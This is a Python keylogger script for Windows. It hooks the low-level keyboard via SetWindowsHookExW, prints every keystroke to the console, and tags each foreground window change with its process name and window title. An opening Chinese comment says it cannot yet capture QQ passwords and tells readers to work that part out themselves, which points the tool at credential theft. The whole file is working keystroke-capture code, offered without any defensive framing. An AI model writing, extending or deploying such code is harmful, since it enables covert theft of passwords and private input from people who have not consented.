#注意此代码不能正确获取QQ密码的记录，如果需要请自行探索，在此不公开细节。
import win32con
import ctypes
from ctypes import *
from ctypes.wintypes import DWORD
import pythoncom,time,random
user32 = windll.user32
kernel32 = windll.kernel32

class KBDLLHOOKSTRUCT(Structure): _fields_=[
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
user32.CallNextHookEx.argtypes = [ctypes.wintypes.HHOOK,c_int,ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM]
class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
        self.current_window = None
        
    def installHookProc(self,pointer):
        self.hooked = self.lUser32.SetWindowsHookExW(
            win32con.WH_KEYBOARD_LL,
            pointer,
            None,
            0
        )
        if not self.hooked:
            return False
        return True
    def uninstalHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def hookProc(nCode, wParam, lParam):
    global KeyLogger
    if user32.GetKeyState(win32con.VK_ESCAPE) & 0x8000:
        #监测ESC是否处于按下状态
        print("\nESC pressed, call uninstallHook()")
        KeyLogger.uninstalHookProc()
        return 0
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    tid = user32.GetWindowThreadProcessId(hwnd,byref(pid))
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
    windll.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title = create_string_buffer(512)
    windll.user32.GetWindowTextA(hwnd,byref(window_title),512)
    window = window_title.value.decode("gbk")
    exe = executable.value.decode("gbk")
    if KeyLogger.current_window != window:
        KeyLogger.current_window = window
        print(f"\n进程id:{pid.value},进程名:{exe},窗口名:{KeyLogger.current_window}",flush = True)
    windll.kernel32.CloseHandle(hwnd)
    windll.kernel32.CloseHandle(h_process)
    
    
    if nCode == win32con.HC_ACTION and wParam == win32con.WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        #user32.GetKeyState(win32con.VK_SHIFT)
        #user32.GetKeyState(win32con.VK_MENU)
        state = (ctypes.c_char * 256)()
        user32.GetKeyboardState(byref(state))
        str = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, str, 8, 0)
        if n > 0:
            if kb.vkCode == win32con.VK_RETURN:
                print(" 回车 ",flush = True)
            elif kb.vkCode == win32con.VK_BACK:
                print(" 退格 ",end = "",flush = True)
            else:
                print(ctypes.wstring_at(str), end = "", flush = True)
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)

KeyLogger = KeyLogger()
pointer = HOOKPROC(hookProc)
KeyLogger.installHookProc(pointer)

msg = ctypes.wintypes.MSG()
user32.GetMessageA(byref(msg), 0, 0, 0) #wait for messages


